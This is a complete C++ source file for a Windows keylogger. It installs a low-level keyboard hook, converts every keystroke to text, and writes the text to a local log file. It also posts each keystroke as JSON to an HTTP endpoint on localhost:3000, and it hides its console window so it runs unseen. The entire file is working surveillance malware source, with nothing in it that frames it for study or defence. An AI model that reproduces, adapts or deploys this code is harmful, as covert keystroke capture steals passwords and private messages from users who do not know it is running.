#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

using namespace std;

HHOOK hHook = NULL;
ofstream outFile("../Logs/keylogs.txt", ios::app);
string keystrokes = "";

void sendKeystrokes(const string &data)
{
    HINTERNET hInternet = InternetOpen("Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet)
    {
        HINTERNET hConnect = InternetConnect(hInternet, "localhost", 3000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect)
        {
            const char *headers = "Content-Type: application/json\r\n";
            HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/keystrokes", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);

            if (hRequest)
            {
                string jsonData = "{\"keystrokes\":\"" + data + "\"}";
                BOOL result = HttpSendRequest(hRequest, headers, strlen(headers), (LPVOID)jsonData.c_str(), jsonData.length());

                if (!result)
                {
                    cerr << "Failed to send HTTP request: " << GetLastError() << endl;
                }

                InternetCloseHandle(hRequest);
            }
            else
            {
                cerr << "Failed to open HTTP request: " << GetLastError() << endl;
            }
            InternetCloseHandle(hConnect);
        }
        else
        {
            cerr << "Failed to connect to HTTP server: " << GetLastError() << endl;
        }
        InternetCloseHandle(hInternet);
    }
    else
    {
        cerr << "Failed to open internet connection: " << GetLastError() << endl;
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = kbdStruct->vkCode;
        bool isShiftPressed = (GetKeyState(VK_SHIFT) & 0x8000);
        bool isCtrlPressed = (GetKeyState(VK_CONTROL) & 0x8000);
        bool isAltPressed = (GetKeyState(VK_MENU) & 0x8000);
        bool isNumLockOn = (GetKeyState(VK_NUMLOCK) & 0x0001);
        bool isCapsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001);

        if (vkCode >= 0x30 && vkCode <= 0x39)
        {
            if (isShiftPressed)
            {
                switch (vkCode)
                {
                case 0x30:
                    keystrokes += ")";
                    break;
                case 0x31:
                    keystrokes += "!";
                    break;
                case 0x32:
                    keystrokes += "@";
                    break;
                case 0x33:
                    keystrokes += "#";
                    break;
                case 0x34:
                    keystrokes += "$";
                    break;
                case 0x35:
                    keystrokes += "%";
                    break;
                case 0x36:
                    keystrokes += "^";
                    break;
                case 0x37:
                    keystrokes += "&";
                    break;
                case 0x38:
                    keystrokes += "*";
                    break;
                case 0x39:
                    keystrokes += "(";
                    break;
                }
            }
            else
            {
                keystrokes += (char)vkCode;
            }
        }
        else if (vkCode >= 0x41 && vkCode <= 0x5A)
        {
            char key = (isShiftPressed) ? (char)vkCode : (char)(vkCode + 32);
            keystrokes += key;
        }
        else
        {
            switch (vkCode)
            {
            case VK_SPACE:
                keystrokes += " ";
                break;
            case VK_RETURN:
                keystrokes += "[Enter]";
                break;
            case VK_TAB:
                keystrokes += "[Tab]";
                break;
            case VK_BACK:
                keystrokes += "[Backspace]";
                break;
            case VK_SHIFT:
                keystrokes += "[Shift]";
                break;
            case VK_CONTROL:
                keystrokes += "[Ctrl]";
                break;
            case VK_MENU:
                keystrokes += "[Alt]";
                break;
            case VK_CAPITAL:
                keystrokes += "[Caps Lock]";
                break;
            case VK_ESCAPE:
                keystrokes += "[Esc]";
                break;
            case VK_LEFT:
                keystrokes += "[Left Arrow]";
                break;
            case VK_RIGHT:
                keystrokes += "[Right Arrow]";
                break;
            case VK_UP:
                keystrokes += "[Up Arrow]";
                break;
            case VK_DOWN:
                keystrokes += "[Down Arrow]";
                break;
            case VK_DELETE:
                keystrokes += "[Delete]";
                break;
            case VK_LWIN:
            case VK_RWIN:
                keystrokes += "[Windows]";
                break;
            case VK_NUMLOCK:
                keystrokes += "[Num Lock]";
                break;
            case VK_SCROLL:
                keystrokes += "[Scroll Lock]";
                break;
            case VK_INSERT:
                keystrokes += "[Insert]";
                break;
            case VK_HOME:
                keystrokes += "[Home]";
                break;
            case VK_END:
                keystrokes += "[End]";
                break;
            case VK_PRIOR:
                keystrokes += "[Page Up]";
                break;
            case VK_NEXT:
                keystrokes += "[Page Down]";
                break;
            case VK_LCONTROL:
            case VK_RCONTROL:
                keystrokes += "[Ctrl]";
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
                keystrokes += "[Shift]";
                break;
            case VK_LMENU:
            case VK_RMENU:
                keystrokes += "[Alt]";
                break;
            case VK_F1:
            case VK_F2:
            case VK_F3:
            case VK_F4:
            case VK_F5:
            case VK_F6:
            case VK_F7:
            case VK_F8:
            case VK_F9:
            case VK_F10:
            case VK_F11:
            case VK_F12:
                keystrokes += "[F" + to_string(vkCode - VK_F1 + 1) + "]";
                break;
            case VK_OEM_1:
                keystrokes += isShiftPressed ? ":" : ";";
                break;
            case VK_OEM_2:
                keystrokes += isShiftPressed ? "?" : "/";
                break;
            case VK_OEM_3:
                keystrokes += isShiftPressed ? "~" : "`";
                break;
            case VK_OEM_4:
                keystrokes += isShiftPressed ? "{" : "[";
                break;
            case VK_OEM_5:
                keystrokes += isShiftPressed ? "|" : "\\";
                break;
            case VK_OEM_6:
                keystrokes += isShiftPressed ? "}" : "]";
                break;
            case VK_OEM_7:
                keystrokes += isShiftPressed ? "\"" : "'";
                break;
            case VK_NUMPAD0:
                keystrokes += "0";
                break;
            case VK_NUMPAD1:
                keystrokes += "1";
                break;
            case VK_NUMPAD2:
                keystrokes += "2";
                break;
            case VK_NUMPAD3:
                keystrokes += "3";
                break;
            case VK_NUMPAD4:
                keystrokes += "4";
                break;
            case VK_NUMPAD5:
                keystrokes += "5";
                break;
            case VK_NUMPAD6:
                keystrokes += "6";
                break;
            case VK_NUMPAD7:
                keystrokes += "7";
                break;
            case VK_NUMPAD8:
                keystrokes += "8";
                break;
            case VK_NUMPAD9:
                keystrokes += "9";
                break;
            case VK_MULTIPLY:
                keystrokes += "*";
                break;
            case VK_ADD:
                keystrokes += "+";
                break;
            case VK_SEPARATOR:
                keystrokes += ",";
                break;
            case VK_SUBTRACT:
                keystrokes += "-";
                break;
            case VK_DECIMAL:
                keystrokes += ".";
                break;
            case VK_DIVIDE:
                keystrokes += "/";
                break;
            default:
                keystrokes += "[Unknown Key: " + to_string(vkCode) + "]";
                break;
            }
        }

        // Log keystrokes to file
        if (outFile.is_open())
        {
            outFile << keystrokes;
            outFile.flush(); // Ensure data is written to file
        }
        else
        {
            cerr << "Failed to open log file for writing" << endl;
        }

        // Send keystrokes in real-time to the server
        sendKeystrokes(keystrokes);

        // Clear the buffer after sending to the server
        keystrokes.clear();
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Function to install the hook
void SetHook()
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (hHook == NULL)
    {
        cerr << "Failed to install hook!" << endl;
    }
}

// Function to remove the hook
void Unhook()
{
    UnhookWindowsHookEx(hHook);
}

// Main function
int main()
{
    // Hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    SetHook();

    // Keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    Unhook();

    // Close the log file
    if (outFile.is_open())
    {
        outFile.close();
    }

    return 0;
}
